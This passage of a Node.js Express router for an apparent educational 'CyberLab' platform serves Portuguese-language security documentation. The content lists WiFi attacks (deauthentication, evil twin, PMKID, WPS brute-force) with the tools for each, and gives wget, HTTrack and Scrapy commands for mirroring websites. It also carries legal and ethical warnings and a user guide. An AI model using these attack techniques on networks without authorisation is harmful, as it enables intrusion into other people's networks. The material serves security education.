                  uses: 'Evil Twin, captive portal, MitM'
                },
                {
                  name: 'hcxdumptool / hcxtools',
                  description: 'Captura de PMKID e handshakes',
                  uses: 'Ataque PMKID (sem necessidade de clientes)'
                }
              ]
            },
            {
              subtitle: '🚀 Ataques Comuns',
              attacks: [
                {
                  attack: 'Deauthentication Attack',
                  description: 'Desconecta clientes do AP enviando frames de deauth. Usado para capturar handshake ou DoS.',
                  tool: 'aireplay-ng --deauth'
                },
                {
                  attack: 'Evil Twin / Rogue AP',
                  description: 'Cria AP falso com mesmo SSID. Usuários conectam e atacante faz MitM.',
                  tool: 'airbase-ng, hostapd, WiFi Pineapple'
                },
                {
                  attack: 'WPA/WPA2 Handshake Capture',
                  description: 'Captura 4-way handshake e quebra offline com dictionary attack.',
                  tool: 'airodump-ng + aircrack-ng/hashcat'
                },
                {
                  attack: 'PMKID Attack',
                  description: 'Extrai PMKID do AP sem clientes conectados. Permite offline cracking.',
                  tool: 'hcxdumptool + hashcat'
                },
                {
                  attack: 'WPS PIN Brute-force',
                  description: 'Força WPS PIN (8 dígitos = 10^8, mas reduzível a 10^4 por falha de implementação).',
                  tool: 'reaver, bully'
                },
                {
                  attack: 'KRACK (Key Reinstallation Attack)',
                  description: 'Explora vulnerabilidade no 4-way handshake para decriptar tráfego.',
                  tool: 'krackattacks-scripts'
                }
              ]
            },
            {
              subtitle: '✅ Checklist de Auditoria',
              checklist: [
                '☑️ Protocolo de criptografia (WPA2 mínimo, WPA3 ideal)',
                '☑️ Força da senha PSK (20+ caracteres)',
                '☑️ WPS desabilitado',
                '☑️ SSID não padrão',
                '☑️ Broadcast de SSID (ocultar não adiciona segurança real)',
                '☑️ Firmware atualizado',
                '☑️ Admin interface não acessível via WiFi',
                '☑️ Guest network isolada',
                '☑️ MAC filtering (não é segurança real, apenas controle)',
                '☑️ Logs de conexões habilitados',
                '☑️ Detecção de rogue APs',
                '☑️ Monitoramento de dispositivos desconhecidos'
              ]
            }
          ]
        },

        // ========== BAIXAR CÓDIGO FONTE DE SITE ==========
        {
          title: '💾 Baixar Código Fonte de um Site',
          content: `Técnicas para realizar download completo de sites para análise offline de segurança, backup ou estudo de estrutura. Útil para análise de vulnerabilidades, desenvolvimento e documentação.`,
          subsections: [
            {
              subtitle: '🛠️ Ferramentas',
              tools: [
                {
                  name: 'wget',
                  description: 'Utilitário de linha de comando para download recursivo de sites',
                  pros: 'Rápido, built-in em Linux, muitas opções',
                  cons: 'Pode perder conteúdo dinâmico JavaScript'
                },
                {
                  name: 'HTTrack',
                  description: 'Website copier offline com interface gráfica',
                  pros: 'Fácil de usar, GUI disponível, mantém estrutura',
                  cons: 'Mais lento que wget'
                },
                {
                  name: 'cURL',
                  description: 'Ferramenta para transferir dados via URLs',
                  pros: 'Flexível, suporta muitos protocolos',
                  cons: 'Requer mais esforço para sites completos'
                },
                {
                  name: 'Scrapy',
                  description: 'Framework Python para web scraping',
                  pros: 'Muito poderoso, customizável, JavaScript rendering',
                  cons: 'Requer conhecimento de Python'
                },
                {
                  name: 'Puppeteer / Playwright',
                  description: 'Automação de browser headless (Chrome/Firefox)',
                  pros: 'Renderiza JavaScript, SPA support',
                  cons: 'Mais lento, requer Node.js'
                },
                {
                  name: 'Burp Suite',
                  description: 'Proxy interceptor que pode salvar todo conteúdo',
                  pros: 'Vê TUDO que passa, incluindo AJAX',
                  cons: 'Manual, requer interação'
                }
              ]
            },
            {
              subtitle: '🚀 Comandos wget',
              commands: [
                {
                  command: 'Download Recursivo Completo',
                  description: 'Baixa site inteiro com estrutura de diretórios',
                  example: '$ wget --recursive --no-clobber --page-requisites --html-extension --convert-links --domains example.com --no-parent http://example.com/'
                },
                {
                  command: 'Versão Curta',
                  description: 'Flags abreviadas do comando acima',
                  example: '$ wget -r -nc -p -E -k -D example.com -np http://example.com/'
                },
                {
                  command: 'Mirror de Site',
                  description: 'Cria mirror exato do site',
                  example: '$ wget --mirror --convert-links --adjust-extension --page-requisites --no-parent http://example.com'
                },
                {
                  command: 'Com User-Agent Customizado',
                  description: 'Simula navegador para evitar bloqueio',
                  example: '$ wget -r -p -U "Mozilla/5.0" http://example.com'
                },
                {
                  command: 'Limitar Profundidade',
                  description: 'Baixa apenas até X níveis de profundidade',
                  example: '$ wget -r -l 3 http://example.com'
                },
                {
                  command: 'Com Delay',
                  description: 'Adiciona delay entre requests para não sobrecarregar servidor',
                  example: '$ wget -r --wait=2 http://example.com'
                },
                {
                  command: 'Continuar Download Interrompido',
                  description: 'Resume download que parou',
                  example: '$ wget -c -r http://example.com'
                },
                {
                  command: 'Download em Background',
                  description: 'Roda em background e loga em arquivo',
                  example: '$ wget -b -r http://example.com'
                }
              ]
            },
            {
              subtitle: '🎯 Explicação das Flags wget',
              flags: [
                {
                  flag: '-r, --recursive',
                  description: 'Download recursivo de links'
                },
                {
                  flag: '-l, --level=NUMBER',
                  description: 'Profundidade máxima de recursão (padrão: 5)'
                },
                {
                  flag: '-nc, --no-clobber',
                  description: 'Não sobrescreve arquivos existentes'
                },
                {
                  flag: '-p, --page-requisites',
                  description: 'Baixa CSS, JS, imagens necessárias para renderizar'
                },
                {
                  flag: '-E, --html-extension',
                  description: 'Salva HTML com extensão .html'
                },
                {
                  flag: '-k, --convert-links',
                  description: 'Converte links para funcionarem offline'
                },
                {
                  flag: '-D, --domains=LIST',
                  description: 'Baixa apenas de domínios especificados'
                },
                {
                  flag: '-np, --no-parent',
                  description: 'Não sobe para diretório pai'
                },
                {
                  flag: '--mirror',
                  description: 'Atalho para -r -N -l inf --no-remove-listing'
                },
                {
                  flag: '-U, --user-agent=AGENT',
                  description: 'Define User-Agent customizado'
                },
                {
                  flag: '--wait=SECONDS',
                  description: 'Aguarda entre requisições'
                },
                {
                  flag: '--random-wait',
                  description: 'Randomiza tempo de espera'
                },
                {
                  flag: '-b, --background',
                  description: 'Roda em background'
                },
                {
                  flag: '-o FILE',
                  description: 'Loga output em arquivo'
                }
              ]
            },
            {
              subtitle: '🎯 HTTrack',
              httrack: [
                {
                  command: 'Download Básico',
                  description: 'Interface interativa',
                  example: '$ httrack http://example.com'
                },
                {
                  command: 'Download para Diretório',
                  description: 'Especifica diretório de saída',
                  example: '$ httrack http://example.com -O /path/to/output'
                },
                {
                  command: 'Com Profundidade',
                  description: 'Limita níveis de recursão',
                  example: '$ httrack http://example.com -r3'
                },
                {
                  command: 'GUI Version',
                  description: 'Abre interface gráfica',
                  example: '$ webhttrack'
                }
              ]
            },
            {
              subtitle: '🔧 Scrapy (Python)',
              scrapy: [
                {
                  step: 1,
                  title: 'Instalar Scrapy',
                  command: '$ pip install scrapy'
                },
                {
                  step: 2,
                  title: 'Criar Projeto',
                  command: '$ scrapy startproject myproject'
                },
                {
                  step: 3,
                  title: 'Criar Spider',
                  code: `import scrapy

class MySpider(scrapy.Spider):
    name = 'myspider'
    start_urls = ['http://example.com']

    def parse(self, response):
        # Salva HTML
        page = response.url.split("/")[-1]
        filename = f'page-{page}.html'
        with open(filename, 'wb') as f:
            f.write(response.body)

        # Segue links
        for href in response.css('a::attr(href)'):
            yield response.follow(href, self.parse)`
                },
                {
                  step: 4,
                  title: 'Executar',
                  command: '$ scrapy crawl myspider'
                }
              ]
            },
            {
              subtitle: '⚠️ Considerações Legais e Éticas',
              legal: [
                '✅ Sempre verificar robots.txt do site',
                '✅ Respeitar Terms of Service do site',
                '✅ Adicionar delay razoável entre requests',
                '✅ Identificar seu bot com User-Agent apropriado',
                '✅ Baixar apenas o necessário para análise',
                '❌ Não sobrecarregar servidores com requests massivos',
                '❌ Não redistribuir conteúdo protegido por copyright',
                '❌ Não fazer scraping de dados pessoais sem consentimento',
                '⚖️ Web scraping pode ser legal ou ilegal dependendo do contexto e jurisdição'
              ]
            },
            {
              subtitle: '🎯 Casos de Uso Legítimos',
              usecases: [
                'Análise de segurança de próprio site',
                'Backup de site próprio',
                'Arquivamento para pesquisa acadêmica',
                'Análise de SEO e estrutura',
                'Desenvolvimento e testes offline',
                'Documentação de evidências (forense)',
                'Análise de malware em sites comprometidos',
                'Pentesting autorizado'
              ]
            }
          ]
        },

        // ========== SEGURANÇA E ÉTICA ==========
        {
          title: '⚖️ Segurança e Ética',
          content: 'Princípios éticos e legais que DEVEM ser seguidos ao usar ferramentas de cibersegurança.',
          warnings: [
            '⚠️ Todas as ferramentas e técnicas devem ser usadas APENAS para fins educacionais, em ambientes próprios ou com autorização explícita por escrito.',
            '⚠️ Testar segurança de redes, sistemas ou aplicações sem autorização é CRIME em praticamente todos os países (Lei nº 12.737/2012 no Brasil).',
            '⚠️ Pentesting não autorizado pode resultar em: prisão, multas pesadas, processos civis, danos à reputação profissional.',
            '⚠️ "Curiosidade" ou "pesquisa" NÃO são defesas legais válidas.',
            '⚠️ Sempre obtenha um "Letter of Authorization" por escrito antes de qualquer teste.',
            '⚠️ Defina escopo claro: IPs, domínios, sistemas autorizados para teste.',
            '⚠️ Informe o cliente sobre riscos de DoS ou interrupção de serviços.',
            '⚠️ Mantenha confidencialidade total sobre vulnerabilidades descobertas.',
            '⚠️ Pratique "Responsible Disclosure": reporte vulnerabilidades ao vendor antes de publicar.',
            '⚠️ Use suas habilidades para DEFENDER, não para atacar.',
            '⚠️ O objetivo é melhorar a segurança, não causar danos ou obter acesso não autorizado.'
          ],
          subsections: [
            {
              subtitle: '📜 Leis Relevantes (Brasil)',
              laws: [
                {
                  law: 'Lei Carolina Dieckmann (Lei 12.737/2012)',
                  description: 'Criminaliza invasão de dispositivos, interrupção de serviços, falsificação de documentos digitais.'
                },
                {
                  law: 'Marco Civil da Internet (Lei 12.965/2014)',
                  description: 'Estabelece princípios para uso da internet no Brasil.'
                },
                {
                  law: 'LGPD (Lei 13.709/2018)',
                  description: 'Lei Geral de Proteção de Dados - regula tratamento de dados pessoais.'
                },
                {
                  law: 'Código Penal',
                  description: 'Art. 154-A (invasão de dispositivo), Art. 313-A (inserção de dados falsos), Art. 313-B (modificação não autorizada).'
                }
              ]
            },
            {
              subtitle: '✅ Boas Práticas',
              practices: [
                'Crie labs pessoais para praticar (VMs, Docker, VulnHub, HackTheBox)',
                'Participe de Bug Bounty programs autorizados (HackerOne, Bugcrowd)',
                'Obtenha certificações (CEH, OSCP, GPEN)',
                'Contribua para projetos open source de segurança',
                'Eduque outros sobre segurança',
                'Mantenha-se atualizado com CVEs e novas técnicas',
                'Documente tudo durante testes autorizados',
                'Respeite prazos e escopos definidos',
                'Comunique findings de forma clara e profissional'
              ]
            }
          ]
        }
      ]
    };

    res.json({
      success: true,
      data: documentation
    });
  } catch (error) {
    console.error('Erro ao gerar documentação:', error);
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

/**
 * GET /api/docs/user-guide
 * Retorna guia do usuário simplificado
 */
router.get('/user-guide', async (req, res) => {
  try {
    const userGuide = {
      title: 'Guia Completo do Usuário - CyberLab',
      version: '4.0.0',
      sections: [
        {
          title: 'Primeiros Passos',
          content: 'Bem-vindo ao CyberLab! Esta plataforma educacional oferece um ambiente completo para aprendizado e prática de cibersegurança.'
        },
        {
          title: 'Interface Principal',
          components: [
            {
              name: 'Painel de Controle',
              description: 'Visão geral do sistema com métricas principais e status'
            },
            {
              name: 'Análise de Rede',
              description: 'Análise detalhada da sua conexão de rede e WiFi'
            },
            {
              name: 'Scanner de Vulnerabilidades',
              description: 'Identifica problemas de segurança em sistemas e redes'
            },
            {
              name: 'Teste de Velocidade',
              description: 'Mede performance da sua rede'
            },
            {
              name: 'Monitor de Ataques',
              description: 'Detecta e alerta sobre atividades suspeitas'
            },
            {
              name: '🧪 Laboratórios de Aprendizado',
              description: 'Ambientes práticos com containers Docker para aprender ferramentas de hacking ético'
            },
            {
              name: '📄 Documentação Completa',
              description: 'Guias detalhados de todas as ferramentas de cibersegurança'
            },
            {
              name: 'Gráficos e Estatísticas',
              description: 'Visualização de dados em tempo real'
            }
          ]
        },
        {
          title: 'Laboratórios Disponíveis',
          labs: [
            {
              name: 'Python para Cibersegurança',
              description: 'Aprenda Python aplicado a segurança: port scanning, packet sniffing, exploits'
            },
            {
              name: 'Ferramentas Kali Linux',
              description: 'Domine Nmap, Metasploit, Burp Suite, Wireshark e mais'
            },
            {
              name: 'Segurança de Redes',
              description: 'Análise de tráfego, firewall, VPN, IDS/IPS'
            },
            {
              name: 'Segurança Web',
              description: 'OWASP Top 10, SQL Injection, XSS, CSRF, pentest web'
            },
            {
              name: 'Docker Avançado',
              description: 'Segurança de containers, escape, hardening'
            }
          ]
        },
        {
          title: 'Dicas Importantes',
          tips: [
            '🎓 Comece pelos laboratórios básicos antes de avançar',
            '📚 Leia a documentação completa de cada ferramenta',
            '🔒 Execute análises de segurança regularmente',
            '🆙 Mantenha firmware do roteador sempre atualizado',
            '🔐 Use senhas fortes (mínimo 20 caracteres aleatórios)',
            '⚠️ Desabilite WPS em redes WiFi',
            '👁️ Monitore dispositivos desconhecidos na rede',
            '🛡️ Configure firewall adequadamente',
            '🔒 Use WPA3 quando disponível, nunca WEP',
            '✅ Pratique apenas em ambientes autorizados',
            '📖 Mantenha-se atualizado com CVEs e novas vulnerabilidades',
            '🤝 Participe de CTFs e Bug Bounty programs para praticar legalmente'
          ]
        },
        {
          title: 'Interpretando Resultados de Rede',
          guide: {
            'Sinal Excelente': 'RSSI > -50 dBm - Conexão ideal',
            'Sinal Bom': 'RSSI -50 a -60 dBm - Conexão estável',
            'Sinal Regular': 'RSSI -60 a -70 dBm - Pode ter quedas ocasionais',
            'Sinal Fraco': 'RSSI < -70 dBm - Conexão instável',
            'Latência Excelente': '< 30ms - Ideal para gaming e VoIP',
            'Latência Boa': '30-50ms - Boa para uso geral',
            'Latência Regular': '50-100ms - Aceitável para navegação',
            'Latência Ruim': '> 100ms - Pode causar problemas'
          }
        },
        {
          title: 'Recursos Adicionais',
          resources: [
            '🌐 HackTheBox - Plataforma de pentesting prático',
            '🌐 TryHackMe - Rooms educacionais de cibersegurança',
            '🌐 VulnHub - VMs vulneráveis para prática',
            '🌐 PortSwigger Web Security Academy - Treinamento web gratuito',
            '🌐 OWASP - Recursos sobre segurança de aplicações web',
            '📚 Kali Linux Documentation - Docs oficiais do Kali',
            '📚 Metasploit Unleashed - Curso gratuito de Metasploit',
            '📺 IppSec (YouTube) - Walkthroughs de HTB',
            '📺 LiveOverflow (YouTube) - Exploits e CTFs',
            '📺 John Hammond (YouTube) - Tutoriais de segurança'
          ]
        }
      ]
    };

    res.json({
      success: true,
      data: userGuide
    });
  } catch (error) {
    console.error('Erro ao gerar guia do usuário:', error);
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

/**
 * POST /api/docs/export
 * Exporta relatório de análise completo
 */
router.post('/export', async (req, res) => {
  try {
    const { format, data } = req.body;

    if (!data) {
      return res.status(400).json({
        success: false,
        message: 'Dados para exportação são obrigatórios'
      });
    }

    const report = {
      title: 'Relatório de Análise de Segurança - CyberLab',
      generated: new Date().toISOString(),
      format: format || 'json',
      data: data,
      summary: {
        totalChecks: 0,
        vulnerabilitiesFound: 0,
        securityScore: 0,
        performanceScore: 0
      }
    };

    // Calcular resumo
    if (data.security) {
      report.summary.securityScore = data.security.score || 0;
      report.summary.vulnerabilitiesFound = data.security.vulnerabilities?.length || 0;
    }

    if (data.performance) {
      report.summary.performanceScore = data.performance.quality?.score || 0;
    }

    res.json({
      success: true,
      data: report,
      message: 'Relatório gerado com sucesso'
    });
  } catch (error) {
    console.error('Erro ao exportar relatório:', error);
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

module.exports = router;
